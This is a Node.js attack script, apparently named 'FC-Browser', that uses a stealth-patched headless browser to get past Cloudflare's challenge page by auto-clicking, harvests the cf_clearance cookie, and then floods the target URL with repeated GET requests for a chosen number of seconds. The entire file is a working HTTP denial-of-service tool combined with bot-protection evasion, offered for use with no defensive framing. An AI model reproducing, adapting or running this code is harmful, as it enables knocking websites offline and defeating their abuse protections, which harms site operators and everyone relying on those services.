console.clear()
const { request } = require('undici');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const os = require('os');
const args = process.argv.slice(2);

if (args.length < 2) {
  return //console.log(`FC-Browser V1.0.0 (Bypass Cloudflare Captcha / UAM)
  //
//Usage: node FC-Browser.js [url] [time]
//--proxy proxy.txt if you using proxy file to start FC-Browser`);
}

const target = args[0];
const time = parseInt(args[1], 10);

// Menambahkan plugin stealth
puppeteer.use(StealthPlugin());

async function visitPage(originalUrl) {
  const browser = await puppeteer.launch({
    headless: true,
    args: [
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--start-maximized',
      '--disable-infobars',
      '--disable-web-security',
      '--disable-blink-features=AutomationControlled'
    ]
  });

  const page = await browser.newPage();
  const userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edge/91.0.864.59';
  
  await page.setUserAgent(userAgent);
  await page.setViewport({ width: 1280, height: 800 });

  console.log(`[!] Navigating to URL: ${originalUrl}`);

  try {
    await page.goto(originalUrl, { waitUntil: 'networkidle2' });

    const isCFProtect = await page.evaluate(() => {
      const titleText = document.title.toLowerCase();
      return titleText.includes("just a moment");
    });

    if (isCFProtect) {
      console.log("[-] Detected CF Protection - Initiating bypass");
      const clickX = 219;
      const clickY = 279;

      const intervalId = setInterval(async () => {
        const stillProtected = await page.evaluate(() => {
          const titleText = document.title.toLowerCase();
          return titleText.includes("just a moment");
        });

        if (stillProtected) {
          await page.mouse.click(clickX, clickY);
        } else {
          console.log("[+] Cloudflare Successfully Bypassed");

          const cookies = await page.cookies();
          const cookieHeader = cookies
  .filter(cookie => cookie.name.startsWith('cf_clearance'))
  .map(cookie => `${cookie.name}=${cookie.value}`)
  .join('; ');

          console.log(`[+] Cookies: ${cookieHeader}`);
          console.log(`[+] User-Agent: ${userAgent}`);
          clearInterval(intervalId);
          
          console.log(`[+] Starting Flooding To ${target} For ${time} Seconds`);
          
          flood(target, userAgent, cookieHeader, time);
        }
      }, 5000);
    } else {
    
      console.log("[+] No CF Protection detected - Proceeding normally");
      console.log(`[+] Starting Flooding To ${target} For ${time} Seconds`);
      
      flood(target, userAgent, "", time);
    }

  } catch (error) {
  /*
    console.error('An error occurred:', error);
    */
  }
}

async function flood(url, userAgent, cookieHeader, time) {
  const endTime = Date.now() + time * 1000;
  const cpuCount = os.cpus().length; // Number of CPU cores

  async function sendRequest() {
    try {
      const headers = {
        'User-Agent': userAgent,
        'Cookie': cookieHeader
      };
  
      const { statusCode } = await request(url, {
        method: 'GET',
        headers
    });
      
      //nsole.log()
      
    } catch (error) {
      
    }
  }

  
  const attackInterval = setInterval(() => {
    for (let i = 0; i < 60; i++) {
        sendRequest()
    }
    setTimeout(() => {
      clearInterval(attackInterval);
      console.log('Attack stopped.');
      process.exit(0);
  }, time * 1000 )
});
  
  console.log(`[+] Flood started on ${cpuCount} cores for ${time} seconds`);
}




visitPage(target)
